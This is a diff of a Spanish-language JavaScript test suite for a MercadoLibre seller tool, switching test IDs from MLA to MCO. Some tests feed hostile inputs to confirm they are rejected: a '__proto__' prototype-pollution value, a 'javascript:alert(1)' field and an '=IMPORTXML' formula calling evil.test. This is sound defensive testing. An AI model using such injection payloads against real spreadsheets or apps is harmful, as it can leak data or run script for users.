-      MLA444: { attributes: [{ id: 'SELLER_SKU', value_name: 'ter-1l' }], category_id: 'MLA1', pictures: [] },
-      MLA555: { attributes: [], variations: [{ attributes: [{ id: 'SELLER_SKU', value_name: 'TER-1L ' }] }, { seller_custom_field: 'ter-1l' }] },
-      MLA556: { attributes: [], variations: [{ seller_custom_field: 'A' }, { seller_custom_field: 'B' }] } };
+      MCO444: { attributes: [{ id: 'SELLER_SKU', value_name: 'ter-1l' }], category_id: 'MCO1', pictures: [] },
+      MCO555: { attributes: [], variations: [{ attributes: [{ id: 'SELLER_SKU', value_name: 'TER-1L ' }] }, { seller_custom_field: 'ter-1l' }] },
+      MCO556: { attributes: [], variations: [{ seller_custom_field: 'A' }, { seller_custom_field: 'B' }] } };
     // Sin costo para el SKU: NO publica, pregunta
     ultimoItemCreado = null;
-    const q = await CP.run({ titulo: 'Termo 1L negro', categoria: 'MLA1', precio: 30000, sku: 'TER-1L' });
+    const q = await CP.run({ titulo: 'Termo 1L negro', categoria: 'MCO1', precio: 30000, sku: 'TER-1L' });
     contiene(q, '¿cuánto te cuesta este producto?', 'SKU **TER-1L**', 'todas las publicaciones con ese SKU');
     if (ultimoItemCreado) throw new Error('publicó sin tener el costo');
-    contiene(await CP.run({ titulo: 'Termo sin sku', categoria: 'MLA1', precio: 1000 }), '¿cuánto te cuesta', 'no tiene SKU');
+    contiene(await CP.run({ titulo: 'Termo sin sku', categoria: 'MCO1', precio: 1000 }), '¿cuánto te cuesta', 'no tiene SKU');
     // Con costo: publica, carga el SKU en la publicación y lo guarda en el SKU
-    const a = await CP.run({ titulo: 'Termo 1L negro', categoria: 'MLA1', precio: 30000, sku: 'TER-1L', costo: 8000 });
+    const a = await CP.run({ titulo: 'Termo 1L negro', categoria: 'MCO1', precio: 30000, sku: 'TER-1L', costo: 8000 });
     contiene(a, '✅ Publicación creada', 'Costo $ 8.000 guardado en el SKU **TER-1L**');
     if (!ultimoItemCreado.attributes?.some((x) => x.id === 'SELLER_SKU' && x.value_name === 'TER-1L')) throw new Error('no cargó el SKU en la publicación');
     // Mismo SKU (otra forma de escribirlo): usa el costo solo, sin preguntar
-    contiene(await CP.run({ titulo: 'Termo 1L rojo', categoria: 'MLA1', precio: 31000, sku: ' ter-1l ' }), '✅ Publicación creada', 'Costo $ 8.000 tomado del SKU **TER-1L**');
+    contiene(await CP.run({ titulo: 'Termo 1L rojo', categoria: 'MCO1', precio: 31000, sku: ' ter-1l ' }), '✅ Publicación creada', 'Costo $ 8.000 tomado del SKU **TER-1L**');
     // Copiando una publicación que tiene ese SKU, también
-    contiene(await CP.run({ copiar_de: 'MLA444', titulo: 'Termo 1L copia' }), 'tomado del SKU **TER-1L**');
+    contiene(await CP.run({ copiar_de: 'MCO444', titulo: 'Termo 1L copia' }), 'tomado del SKU **TER-1L**');
     // Otro SKU sin costo: pregunta
-    contiene(await CP.run({ titulo: 'Mate', categoria: 'MLA1', precio: 9000, sku: 'MATE-9' }), '¿cuánto te cuesta', 'MATE-9');
+    contiene(await CP.run({ titulo: 'Mate', categoria: 'MCO1', precio: 9000, sku: 'MATE-9' }), '¿cuánto te cuesta', 'MATE-9');
     // SKU peligrosos o inválidos
-    for (const malo of ['__proto__', 'x\u0007y', 'z'.repeat(61)]) contiene(await CP.run({ titulo: 'x', categoria: 'MLA1', sku: malo, sin_costo: true }), 'SKU no es válido');
+    for (const malo of ['__proto__', 'x\u0007y', 'z'.repeat(61)]) contiene(await CP.run({ titulo: 'x', categoria: 'MCO1', sku: malo, sin_costo: true }), 'SKU no es válido');
     if (({}).costo !== undefined || Object.prototype.costo !== undefined) throw new Error('contaminó el prototipo');
     // La calculadora de otra publicación con el mismo SKU (en variantes) usa ese costo
-    itemMLA111.price = 42000;
-    contiene(await REN.run({ item_id: 'MLA555' }), 'costo $ 8.000 del SKU TER-1L');
+    itemMCO111.price = 42000;
+    contiene(await REN.run({ item_id: 'MCO555' }), 'costo $ 8.000 del SKU TER-1L');
     // Variantes con SKUs distintos: no adivina
-    contiene(await REN.run({ item_id: 'MLA556' }), 'Para calcular la rentabilidad real me falta', 'costo del producto');
+    contiene(await REN.run({ item_id: 'MCO556' }), 'Para calcular la rentabilidad real me falta', 'costo del producto');
     // Cambiar el costo en una publicación lo cambia para todas las del SKU
-    contiene(await CER.run({ accion: 'guardar', item_id: 'MLA444', costo: 9000 }), 'SKU TER-1L', 'todas las publicaciones con ese SKU');
-    contiene(await REN.run({ item_id: 'MLA555' }), 'costo $ 9.000 del SKU TER-1L', 'cargado en MLA444');
-    contiene(await CER.run({ accion: 'ver', item_id: 'MLA555' }), 'SKU: TER-1L', 'Costo: $ 9.000 (del SKU TER-1L, cargado en MLA444)');
+    contiene(await CER.run({ accion: 'guardar', item_id: 'MCO444', costo: 9000 }), 'SKU TER-1L', 'todas las publicaciones con ese SKU');
+    contiene(await REN.run({ item_id: 'MCO555' }), 'costo $ 9.000 del SKU TER-1L', 'cargado en MCO444');
+    contiene(await CER.run({ accion: 'ver', item_id: 'MCO555' }), 'SKU: TER-1L', 'Costo: $ 9.000 (del SKU TER-1L, cargado en MCO444)');
     // Guardar directo por SKU y ver la lista
     contiene(await CER.run({ accion: 'guardar', item_id: 'mate-9', costo: 3500 }), 'SKU MATE-9');
-    contiene(await CP.run({ titulo: 'Mate', categoria: 'MLA1', precio: 9000, sku: 'MATE-9' }), 'tomado del SKU **MATE-9**');
+    contiene(await CP.run({ titulo: 'Mate', categoria: 'MCO1', precio: 9000, sku: 'MATE-9' }), 'tomado del SKU **MATE-9**');
     contiene(await CER.run({ accion: 'ver' }), 'Costos por SKU', '**TER-1L**: costo $ 9.000', '**MATE-9**: costo $ 3.500');
     // Contabilidad: las ventas traen el SKU de la orden y toman el costo del SKU aunque la publicación sea nueva
     const ng = await import('../src/negocio.js');
-    const [v] = ng.ventasPorItem([{ order_items: [{ item: { id: 'MLA777', title: 'Termo nuevo', seller_sku: 'Ter-1L' }, quantity: 2, unit_price: 30000 }] }]);
+    const [v] = ng.ventasPorItem([{ order_items: [{ item: { id: 'MCO777', title: 'Termo nuevo', seller_sku: 'Ter-1L' }, quantity: 2, unit_price: 30000 }] }]);
     if (v.sku !== 'TER-1L') throw new Error('la venta no trajo el SKU: ' + v.sku);
-    const sb = cer.saberDe('MLA777', v.sku);
+    const sb = cer.saberDe('MCO777', v.sku);
     if (sb.costo !== 9000 || sb.costoDelSku?.sku !== 'TER-1L') throw new Error('no tomó el costo del SKU para la venta: ' + JSON.stringify(sb));
     // Una publicación que ya tenía costo le pasa el costo a su SKU la primera vez que se lo ve
-    cer.vincularSku('MLA111', 'TERMO-A');
+    cer.vincularSku('MCO111', 'TERMO-A');
     if (cer.costoDeSku('TERMO-A') !== 20000) throw new Error('el SKU no heredó el costo que ya tenía la publicación');
     // Olvidar un SKU
     contiene(await CER.run({ accion: 'olvidar', item_id: 'MATE-9' }), 'Olvidado');
     if (cer.costoDeSku('MATE-9') != null) throw new Error('no olvidó el SKU');
   });
   await caso('ml_publicidad en vivo: detalle del anuncio y campañas', async () => {
-    const t = await tool('ml_publicidad').run({ item_id: 'MLA111', dias: 30 });
+    const t = await tool('ml_publicidad').run({ item_id: 'MCO111', dias: 30 });
     contiene(t, 'Product Ads', '15.000', 'ACOS', '12.5%', 'en vivo');
     contiene(await tool('ml_publicidad').run({}), 'Campaña general', '30.000', '15%');
   });
   await caso('ml_rentabilidad pide lo que falta sin inventar', async () => {
-    contiene(await tool('ml_rentabilidad').run({ item_id: 'MLA222' }), 'me falta', 'costo del producto');
+    contiene(await tool('ml_rentabilidad').run({ item_id: 'MCO222' }), 'me falta', 'costo del producto');
   });
   await caso('ml_rentabilidad: desglose completo con comisión real, ads en vivo e impuestos', async () => {
-    itemMLA111.price = 42000;
-    const t = await tool('ml_rentabilidad').run({ item_id: 'MLA111', costo: 20000, impuestos_pct: 10 });
+    itemMCO111.price = 42000;
+    const t = await tool('ml_rentabilidad').run({ item_id: 'MCO111', costo: 20000, impuestos_pct: 10 });
     // 42000 − 5880 (14%) − 1500 (15000/10 ventas ads) − 0 envío − 4200 (10%) − 20000 = 10420 · margen 24,8%
     contiene(t, '5.880', '1.500', '4.200', '10.420', '24,8', 'ACOS máximo');
   });
   await caso('ml_clips de un ítem muestra estados, motivos y veredicto', async () => {
-    const t = await tool('ml_clips').run({ item_id: 'MLA111' });
+    const t = await tool('ml_clips').run({ item_id: 'MCO111' });
     contiene(t, '✅ publicado', '⏳ en revisión', '❌ rechazado', 'ya se subió antes', 'Veredicto', '1 sirviendo');
   });
   await caso('ml_clips sin item arma el mapa de video de la tienda', async () => {
     const t = await tool('ml_clips').run({});
-    contiene(t, 'Mapa de video', 'MLA111', 'MLA222', 'sin clips');
+    contiene(t, 'Mapa de video', 'MCO111', 'MCO222', 'sin clips');
   });
   await caso('ml_subir_clip valida local y sube con moderación informada', async () => {
     const fs = await import('node:fs');
     fs.writeFileSync('/tmp/clip-prueba.txt', 'x');
-    contiene(await tool('ml_subir_clip').run({ item_id: 'MLA111', archivo: '/tmp/clip-prueba.txt' }), 'MP4');
+    contiene(await tool('ml_subir_clip').run({ item_id: 'MCO111', archivo: '/tmp/clip-prueba.txt' }), 'MP4');
     fs.writeFileSync('/tmp/clip-prueba.mp4', Buffer.alloc(2048));
-    const t = await tool('ml_subir_clip').run({ item_id: 'MLA111', archivo: '/tmp/clip-prueba.mp4' });
+    const t = await tool('ml_subir_clip').run({ item_id: 'MCO111', archivo: '/tmp/clip-prueba.mp4' });
     contiene(t, 'Clip subido', 'clip-nuevo-999', '24-48', 'ml_clips');
-    contiene(await tool('ml_borrar_clip').run({ item_id: 'MLA111', clip_uuid: 'clip-rechazo-003' }), 'borrado');
+    contiene(await tool('ml_borrar_clip').run({ item_id: 'MCO111', clip_uuid: 'clip-rechazo-003' }), 'borrado');
   });
   await caso('ml_descubrir_ganadores por categoría usa el ranking oficial + tendencias', async () => {
-    const t = await tool('ml_descubrir_ganadores').run({ categoria: 'MLA1055' });
-    contiene(t, 'ganadores', 'más vendidos', 'MLA111', 'termo acero 1 litro', 'demanda validada');
+    const t = await tool('ml_descubrir_ganadores').run({ categoria: 'MCO1055' });
+    contiene(t, 'ganadores', 'más vendidos', 'MCO111', 'termo acero 1 litro', 'demanda validada');
   });
   await caso('ml_descubrir_ganadores por búsqueda analiza competencia, precios y dominancia', async () => {
     const t = await tool('ml_descubrir_ganadores').run({ busqueda: 'termo 1 litro' });
     contiene(t, 'Análisis de mercado', 'Competencia', 'mediana', 'Señal de oportunidad');
   });
   await caso('ml_historial_competencia arma la base de datos con cada control', async () => {
-    itemMLA111.price = 42000; itemMLA111.sold_quantity = 55;
-    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MLA333' }), 'Agregado');
-    itemMLA111.price = 36500; itemMLA111.sold_quantity = 61;
+    itemMCO111.price = 42000; itemMCO111.sold_quantity = 55;
+    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MCO333' }), 'Agregado');
+    itemMCO111.price = 36500; itemMCO111.sold_quantity = 61;
     await tool('ml_novedades_competencia').run({});
-    const t = await tool('ml_historial_competencia').run({ ref: 'MLA333' });
-    contiene(t, 'Historial', 'MLA333', '42.000', '36.500', '%', 'Resumen');
-    itemMLA111.price = 42000; itemMLA111.sold_quantity = 55;
+    const t = await tool('ml_historial_competencia').run({ ref: 'MCO333' });
+    contiene(t, 'Historial', 'MCO333', '42.000', '36.500', '%', 'Resumen');
+    itemMCO111.price = 42000; itemMCO111.sold_quantity = 55;
   });
   await caso('ml_vigilar quitar limpia objetivo y snapshot', async () => {
     contiene(await tool('ml_vigilar').run({ accion: 'quitar', ref: 'RIVAL' }), 'Quitado');
@@ -515,21 +515,21 @@ async function pruebas() {
     for (const sk of todas) if (!fs.existsSync(path.join('skills', sk, 'SKILL.md'))) throw new Error('skill inexistente: ' + sk);
   });
   await caso('trabajadores: asignar por nombre (con y sin acento) o puesto, tipo deducido', async () => {
-    mercado.items = { MLA500: { price: 45000, sold_quantity: 10, available_quantity: 5, status: 'active', title: 'Termo rival A' }, MLA600: { price: 30000, sold_quantity: 100, available_quantity: 3, status: 'active', title: 'Termo rival B' } };
-    mercado.busqueda = [{ id: 'MLA901', title: 'Termo líder', price: 35000, seller: { nickname: 'LIDER' } }, { id: 'MLA111', title: 'Mi termo', price: 42000, seller: { nickname: 'TIENDA_DEMO' } }];
-    contiene(await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MLA500', mi_item: 'MLA111' }), 'Vera', 'publicacion', 'MLA500', 'MLA111', 'vigilancia-ml');
-    contiene(await T.run({ accion: 'asignar', trabajador: 'tomas', ref: 'MLA600' }), 'Tomás');
-    contiene(await T.run({ accion: 'asignar', trabajador: 'ranking', ref: 'termo 1 litro', mi_item: 'MLA111', umbral: 1 }), 'Martina', 'busqueda');
+    mercado.items = { MCO500: { price: 45000, sold_quantity: 10, available_quantity: 5, status: 'active', title: 'Termo rival A' }, MCO600: { price: 30000, sold_quantity: 100, available_quantity: 3, status: 'active', title: 'Termo rival B' } };
+    mercado.busqueda = [{ id: 'MCO901', title: 'Termo líder', price: 35000, seller: { nickname: 'LIDER' } }, { id: 'MCO111', title: 'Mi termo', price: 42000, seller: { nickname: 'TIENDA_DEMO' } }];
+    contiene(await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MCO500', mi_item: 'MCO111' }), 'Vera', 'publicacion', 'MCO500', 'MCO111', 'vigilancia-ml');
+    contiene(await T.run({ accion: 'asignar', trabajador: 'tomas', ref: 'MCO600' }), 'Tomás');
+    contiene(await T.run({ accion: 'asignar', trabajador: 'ranking', ref: 'termo 1 litro', mi_item: 'MCO111', umbral: 1 }), 'Martina', 'busqueda');
     contiene(await T.run({ accion: 'asignar', trabajador: 'Bruno', ref: 'termo 1 litro' }), 'Bruno');
     contiene(await T.run({ accion: 'asignar', trabajador: 'Sofía' }), 'Sofía', 'tendencias');
-    contiene(await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MLA500', mi_item: 'MLA111' }), 'actualizó');
+    contiene(await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MCO500', mi_item: 'MCO111' }), 'actualizó');
   });
   await caso('trabajadores: rechaza tareas que no son de su oficio y nombres desconocidos', async () => {
     let msg = '';
-    try { await T.run({ accion: 'asignar', trabajador: 'Bruno', tipo: 'publicacion', ref: 'MLA1' }); } catch (e) { msg = e.message; }
+    try { await T.run({ accion: 'asignar', trabajador: 'Bruno', tipo: 'publicacion', ref: 'MCO1' }); } catch (e) { msg = e.message; }
     contiene(msg, 'no trabaja con');
     contiene(await T.run({ accion: 'asignar', trabajador: 'Pepe', ref: 'x' }), 'No conozco');
-    try { await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MLA1', mi_item: 'javascript:alert(1)' }); msg = ''; } catch (e) { msg = e.message; }
+    try { await T.run({ accion: 'asignar', trabajador: 'Vera', ref: 'MCO1', mi_item: 'javascript:alert(1)' }); msg = ''; } catch (e) { msg = e.message; }
     contiene(msg, 'mi_item');
   });
   await caso('trabajadores: primer control guarda la base y no inventa alertas (Clara sí pregunta de entrada)', async () => {
@@ -538,9 +538,9 @@ async function pruebas() {
     for (const p of ['Centinela de precios', 'Contador de ventas', 'Vigía de búsquedas', 'Cazador de rivales', 'Radar de tendencias']) if (t.includes(p)) throw new Error('avisó en el primer control: ' + p);
   });
   await caso('trabajadores: detectan precio por debajo tuyo, quiebre de stock, líder, puesto, rival nuevo y tendencias (con skill sugerida)', async () => {
-    mercado.items.MLA500 = { ...mercado.items.MLA500, price: 39000 };
-    mercado.items.MLA600 = { ...mercado.items.MLA600, sold_quantity: 106, available_quantity: 0 };
-    mercado.busqueda = [{ id: 'MLA902', title: 'Termo usurpador', price: 31000, seller: { nickname: 'USURPADOR' } }, ...mercado.busqueda];
+    mercado.items.MCO500 = { ...mercado.items.MCO500, price: 39000 };
+    mercado.items.MCO600 = { ...mercado.items.MCO600, sold_quantity: 106, available_quantity: 0 };
+    mercado.busqueda = [{ id: 'MCO902', title: 'Termo usurpador', price: 31000, seller: { nickname: 'USURPADOR' } }, ...mercado.busqueda];
     mercado.tendencias = [{ keyword: 'termo de vidrio' }, ...mercado.tendencias];
     const t = await T.run({ accion: 'correr' });
     contiene(t, 'Vera', 'MÁS BARATO', 'calculadora-ml', 'Tomás', 'vendió ~6', 'SIN STOCK', 'publicidad-ml', 'Martina', 'nuevo líder', 'USURPADOR', 'Bajaste', 'puesto 2 → 3', 'mejorar-publicaciones-ml', 'Bruno', 'Rival nuevo', 'competencia-ml', 'Sofía', 'termo de vidrio', 'descubrir-ganadores-ml');
@@ -560,13 +560,13 @@ async function pruebas() {
     const r = await tr.correrCiclo({});
     if (r.corridos.length) throw new Error('corrió estando en pausa: ' + r.corridos);
     contiene(await T.run({ accion: 'activar' }), 'Activados');
-    contiene(await T.run({ accion: 'equipo', trabajador: 'Vera' }), 'activo', 'cada 10 min', 'MLA500');
+    contiene(await T.run({ accion: 'equipo', trabajador: 'Vera' }), 'activo', 'cada 10 min', 'MCO500');
   });
   await caso('trabajadores: sin tareas propias vigilan tus seguidos de ml_vigilar', async () => {
-    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MLA700' }), 'Agregado');
+    contiene(await tool('ml_vigilar').run({ accion: 'agregar', tipo: 'publicacion', ref: 'MCO700' }), 'Agregado');
     const d = tr.leerEquipo();
-    if (!tr.tareasDe(d, 'ventas').some((t) => t.ref === 'MLA700' && t.deLista)) throw new Error('Tomás no heredó el seguido');
-    contiene(await T.run({ accion: 'quitar', trabajador: 'Tomás', ref: 'MLA600' }), 'dejó la tarea');
+    if (!tr.tareasDe(d, 'ventas').some((t) => t.ref === 'MCO700' && t.deLista)) throw new Error('Tomás no heredó el seguido');
+    contiene(await T.run({ accion: 'quitar', trabajador: 'Tomás', ref: 'MCO600' }), 'dejó la tarea');
   });
   await caso('trabajadores: candado — un solo corredor; el servicio 24/7 releva al conector', async () => {
     const lock = path.join(dirTemp, 'trabajadores.lock');
@@ -633,14 +633,14 @@ async function pruebas() {
     if (soloVera.includes('Radar de tendencias')) throw new Error('resultados de Vera trae a Sofía');
   });
   await caso('resultados: Tomás calcula el ritmo real de ventas y la facturación estimada del rival', async () => {
-    mercado.items.MLA650 = { price: 10000, sold_quantity: 200, available_quantity: 8, status: 'active', title: 'Mate rival' };
-    await T.run({ accion: 'asignar', trabajador: 'Tomás', ref: 'MLA650' });
+    mercado.items.MCO650 = { price: 10000, sold_quantity: 200, available_quantity: 8, status: 'active', title: 'Mate rival' };
+    await T.run({ accion: 'asignar', trabajador: 'Tomás', ref: 'MCO650' });
     await tr.correrCiclo({ solo: ['ventas'], forzar: true });
-    tr.actualizarEquipo((d) => { const k = Object.keys(d.snapshots).find((x) => x.startsWith('ventas|') && x.includes('MLA650')); d.snapshots[k].t -= 2 * 86400000; d.snapshots[k].datos.base.t -= 2 * 86400000; });
-    mercado.items.MLA650.sold_quantity = 210;
+    tr.actualizarEquipo((d) => { const k = Object.keys(d.snapshots).find((x) => x.startsWith('ventas|') && x.includes('MCO650')); d.snapshots[k].t -= 2 * 86400000; d.snapshots[k].datos.base.t -= 2 * 86400000; });
+    mercado.items.MCO650.sold_quantity = 210;
     await tr.correrCiclo({ solo: ['ventas'], forzar: true });
     const r = rs.armarResultados().ventas;
-    const fila = r.filas.find((f) => f[0] === 'MLA650');
+    const fila = r.filas.find((f) => f[0] === 'MCO650');
     if (!fila || fila[4] !== 10 || fila[6] !== 5 || fila[7] !== 1500000) throw new Error('ritmo mal calculado: ' + JSON.stringify(fila));
     contiene(await T.run({ accion: 'resultados', trabajador: 'Tomás' }), 'Mate rival', '≈ 5 u./día', '$ 1.500.000');
   });
@@ -670,7 +670,7 @@ async function pruebas() {
     const b = planilla.recibidos.at(-1);
     for (const h of ['Vera - Centinela de precios', 'Tomás - Contador de ventas', 'Martina - Vigía de búsquedas', 'Bruno - Cazador de rivales nuevos', 'Sofía - Radar de tendencias']) if (!b.resultados[h]) throw new Error('falta la pestaña ' + h);
     const vera = b.resultados['Vera - Centinela de precios'];
-    if (vera[0][0] !== 'Objetivo' || !vera.some((f) => f[0] === 'MLA500')) throw new Error('pestaña de Vera vacía');
+    if (vera[0][0] !== 'Objetivo' || !vera.some((f) => f[0] === 'MCO500')) throw new Error('pestaña de Vera vacía');
     if (vera.some((f) => f.length !== vera[0].length)) throw new Error('filas de distinto ancho (Sheets las rechaza)');
   });
   const dirDrive = fs.mkdtempSync(path.join(os.tmpdir(), 'drive-'));
@@ -683,14 +683,14 @@ async function pruebas() {
   });
   await caso('drive: cada control manda las alertas nuevas a la planilla y a la carpeta', async () => {
     planilla.recibidos.length = 0;
-    mercado.items.MLA500 = { ...mercado.items.MLA500, price: 37000 };
+    mercado.items.MCO500 = { ...mercado.items.MCO500, price: 37000 };
     contiene(await T.run({ accion: 'correr', trabajador: 'Vera' }), 'resultados enviados a Google Drive');
     const b = planilla.recibidos.at(-1);
     if (!b.alertas.some((f) => String(f[4]).includes('39.000') && String(f[1]).includes('Vera') && f[5] === '')) throw new Error('la planilla no recibió la alerta de precio: ' + JSON.stringify(b.alertas));
     contiene(fs.readFileSync(path.join(dirDrive, rs.CARPETA_NOMBRE, 'Alertas.csv'), 'utf8'), '37.000', 'Vera');
   });
   await caso('drive: un título de rival con fórmula NUNCA se ejecuta en tu planilla (anti inyección)', async () => {
-    mercado.items.MLA500 = { ...mercado.items.MLA500, title: '=IMPORTXML("http://evil.test";"//a")', price: 36000 };
+    mercado.items.MCO500 = { ...mercado.items.MCO500, title: '=IMPORTXML("http://evil.test";"//a")', price: 36000 };
     planilla.recibidos.length = 0;
     await T.run({ accion: 'correr', trabajador: 'Vera' });
     const celdas = JSON.stringify(planilla.recibidos.at(-1));
@@ -725,23 +725,23 @@ async function pruebas() {
     contiene(await T.run({ accion: 'correr' }), 'Lucía audita sola cada 15 días');
   });
   await caso('Lucía: primera auditoría de cada tienda conectada, con las urgentes y la skill a usar', async () => {
-    mercado.items.MLA222 = { last_updated: new Date(Date.now() - 95 * 86400000).toISOString(), pictures: [{ max_size: '400x400' }], available_quantity: 0 };
+    mercado.items.MCO222 = { last_updated: new Date(Date.now() - 95 * 86400000).toISOString(), pictures: [{ max_size: '400x400' }], available_quantity: 0 };
     tr.leerBandeja({ marcar: true });
     const t = await T.run({ accion: 'correr', trabajador: 'Lucía' });
-    contiene(t, 'Lucía', 'Auditoría quincenal de tienda TIENDA_DEMO', 'Auditoría quincenal de tienda TIENDA_DOS', '2 publicaciones', 'primera auditoría', 'MLA222 «Producto MLA222» está en rojo: SIN STOCK', 'mejorar-publicaciones-ml', 'sin actualizar hace 60+ días');
+    contiene(t, 'Lucía', 'Auditoría quincenal de tienda TIENDA_DEMO', 'Auditoría quincenal de tienda TIENDA_DOS', '2 publicaciones', 'primera auditoría', 'MCO222 «Producto MCO222» está en rojo: SIN STOCK', 'mejorar-publicaciones-ml', 'sin actualizar hace 60+ días');
     if (t.includes('🔴 🔴')) throw new Error('emoji duplicado');
     if (t.includes('avisan desde el próximo control')) throw new Error('dice que Lucía avisa recién la próxima');
     const res = await T.run({ accion: 'resultados', trabajador: 'Lucía' });
-    contiene(res, 'Auditora de publicaciones', 'MLA222', 'MLA111', '🔴', 'próxima auditoría', 'SIN STOCK', 'Días sin tocar', '| 95 |');
-    if (res.indexOf('MLA222') > res.indexOf('MLA111')) throw new Error('la tabla no pone las peores primero');
+    contiene(res, 'Auditora de publicaciones', 'MCO222', 'MCO111', '🔴', 'próxima auditoría', 'SIN STOCK', 'Días sin tocar', '| 95 |');
+    if (res.indexOf('MCO222') > res.indexOf('MCO111')) throw new Error('la tabla no pone las peores primero');
   });
   await caso('Lucía: la segunda auditoría compara con la anterior (qué mejoró, qué empeoró, precio congelado)', async () => {
-    // MLA222 se pone al día; a MLA111 le fijamos 50 días con el mismo precio en la base
-    mercado.items.MLA222 = { last_updated: new Date().toISOString(), pictures: [{ max_size: '1200x1200' }, { max_size: '1200x1200' }, { max_size: '1200x1200' }], available_quantity: 30, video_id: 'v9', attributes: [{ id: 'BRAND', value_name: 'Marca X' }, { id: 'MODEL', value_name: 'Pro' }], sale_terms: [{ id: 'WARRANTY_TIME', value_name: '30 días' }], catalog_listing: false };
-    (await import('../src/db.js')).db().prepare("UPDATE auditorias SET t = t - ? WHERE item_id = 'MLA111'").run(50 * 86400000);
+    // MCO222 se pone al día; a MCO111 le fijamos 50 días con el mismo precio en la base
+    mercado.items.MCO222 = { last_updated: new Date().toISOString(), pictures: [{ max_size: '1200x1200' }, { max_size: '1200x1200' }, { max_size: '1200x1200' }], available_quantity: 30, video_id: 'v9', attributes: [{ id: 'BRAND', value_name: 'Marca X' }, { id: 'MODEL', value_name: 'Pro' }], sale_terms: [{ id: 'WARRANTY_TIME', value_name: '30 días' }], catalog_listing: false };
+    (await import('../src/db.js')).db().prepare("UPDATE auditorias SET t = t - ? WHERE item_id = 'MCO111'").run(50 * 86400000);
     const t = await T.run({ accion: 'correr', trabajador: 'Lucía' });
     contiene(t, 'desde la anterior', 'mejoraron');
-    if (/mejoraron 0 mejoraron|0 mejoraron/.test(t) && !/[1-9] mejoraron/.test(t)) throw new Error('no detectó que MLA222 mejoró: ' + t.slice(0, 300));
+    if (/mejoraron 0 mejoraron|0 mejoraron/.test(t) && !/[1-9] mejoraron/.test(t)) throw new Error('no detectó que MCO222 mejoró: ' + t.slice(0, 300));
     const aud = await tool('ml_auditar_publicaciones').run({});
     contiene(aud, 'precio sin cambios hace 50 días');
     const h = await T.run({ accion: 'historial', trabajador: 'Lucía' });
@@ -763,7 +763,7 @@ async function pruebas() {
   await caso('faq: limpia saludos y firmas, descarta datos de contacto, stock, precio y envíos', async () => {
     if (fq.limpiarRespuesta('Hola, buen día! Mide 27 cm. Gracias por tu consulta, quedamos a disposición') !== 'Mide 27 cm.') throw new Error('no limpió: ' + fq.limpiarRespuesta('Hola, buen día! Mide 27 cm. Gracias por tu consulta, quedamos a disposición'));
     for (const r of ['Escribime al 11 5555-5555', 'mandame un mail a x@y.com', 'mirá www.mitienda.com', 'pasame tu whatsapp', 'seguinos en instagram']) if (fq.limpiarRespuesta(r) !== null) throw new Error('dejó pasar contacto: ' + r);
-    const g = fq.agrupar(preguntasPorItem.MLA111);
+    const g = fq.agrupar(preguntasPorItem.MCO111);
     const temas = g.map((x) => x.tema);
     if (!temas.includes('medidas') || !temas.includes('uso')) throw new Error('no agrupó por tema: ' + temas);
     if (g.find((x) => x.tema === 'medidas').veces !== 2 || g.find((x) => x.tema === 'uso').veces !== 2) throw new Error('no contó las repetidas escritas distinto');
@@ -771,13 +771,13 @@ async function pruebas() {
     if (g.some((x) => /Hola|Saludos|consulta/i.test(x.respuesta))) throw new Error('dejó saludos en la respuesta');
   });
   await caso('faq: lo que la descripción ya cubre no se repite', async () => {
-    const pre = preguntasPorItem.MLA111;
+    const pre = preguntasPorItem.MCO111;
     if (fq.faltantes(pre, 'Termo de acero. Medidas: 27 cm de alto.').some((g) => g.tema === 'medidas')) throw new Error('repitió medidas ya cubiertas');
     if (!fq.faltantes(pre, 'Termo de acero.').some((g) => g.tema === 'medidas')) throw new Error('no detectó medidas faltantes');
   });
   await caso('faq: la propuesta usa TUS respuestas y no toca nada sin aplicar', async () => {
     descripcionesPut.length = 0;
-    const t = await FAQ.run({ item_id: 'MLA111' });
+    const t = await FAQ.run({ item_id: 'MCO111' });
     contiene(t, '2 pregunta(s) para sumar', 'medidas', '27 cm de alto', 'lavavajillas', '2 veces', 'PREGUNTAS FRECUENTES', 'no toqué nada', 'aplicar=true');
     if (t.includes('5555') || /stock disponible|todo el país/.test(t)) throw new Error('la propuesta trae contacto/stock/envío');
     if (descripcionesPut.length) throw new Error('escribió sin aplicar=true');
@@ -786,17 +786,17 @@ async function pruebas() {
     const t = await T.run({ accion: 'correr', trabajador: 'Lucía' });
     contiene(t, 'con preguntas repetidas que faltan en la descripción');
     const al = tr.alertasRecientes({ trabajador: 'auditor' });
-    if (!al.some((a) => a.skill === 'faq-descripcion-ml' && a.texto.includes('MLA111') && a.texto.includes('no están en su descripción'))) throw new Error('Lucía no avisó con la skill de preguntas frecuentes');
+    if (!al.some((a) => a.skill === 'faq-descripcion-ml' && a.texto.includes('MCO111') && a.texto.includes('no están en su descripción'))) throw new Error('Lucía no avisó con la skill de preguntas frecuentes');
     const sn = Object.entries(tr.leerEquipo().snapshots).find(([k]) => k.startsWith('auditor|'))[1];
-    if (!sn.datos.items.MLA111.codigos.includes('faq_faltante')) throw new Error('la auditoría no marcó faq_faltante en MLA111');
+    if (!sn.datos.items.MCO111.codigos.includes('faq_faltante')) throw new Error('la auditoría no marcó faq_faltante en MCO111');
     contiene(await tool('ml_auditar_publicaciones').run({}), 'no están en la descripción', 'ml_faq_descripcion');
     contiene(await T.run({ accion: 'equipo', trabajador: 'Lucía' }), 'faq-descripcion-ml');
   });
   await caso('faq: aplicar todas las que marcó Lucía escribe el bloque en la descripción real', async () => {
     descripcionesPut.length = 0;
     const t = await FAQ.run({ todas: true, aplicar: true });
-    contiene(t, '✅ MLA111', 'descripción actualizada', '2 pregunta(s) nueva(s)');
-    const put = descripcionesPut.find((x) => x.id === 'MLA111');
+    contiene(t, '✅ MCO111', 'descripción actualizada', '2 pregunta(s) nueva(s)');
+    const put = descripcionesPut.find((x) => x.id === 'MCO111');
     if (!put) throw new Error('no escribió en ML');
     if (put.query.api_version !== '2') throw new Error('no usó api_version=2');
